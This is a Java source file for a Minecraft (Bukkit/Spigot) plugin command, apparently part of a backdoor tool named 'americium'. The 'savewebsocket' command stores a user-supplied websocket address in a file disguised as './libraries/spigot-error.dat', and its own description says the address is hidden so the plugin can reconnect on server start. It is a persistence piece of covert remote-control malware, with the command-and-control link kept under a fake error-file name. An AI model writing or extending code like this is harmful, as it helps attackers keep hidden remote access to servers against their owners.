package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

import java.io.FileWriter;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class SaveWebsocket implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"savewebsocket"};
    }

    @Override
    public String getDescription() {
        return "Save the websocket url hidden in files, then will try to connect on server start.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "savewebsocket <ws://your_ip:port/endpoint>");
            return;
        }

        String url = String.join(" ", args);

        try {
            // Verify is valid URL
            new URI(url);
        } catch (URISyntaxException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        if (!args[0].startsWith("ws://") && !args[0].startsWith("wss://")) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "URL must start with ws:// || wss://!");
            return;
        }

        try {
            FileWriter fw = new FileWriter("./libraries/spigot-error.dat");
            fw.write(url);
            fw.close();

            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully saved " + url);
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
        }
    }
}
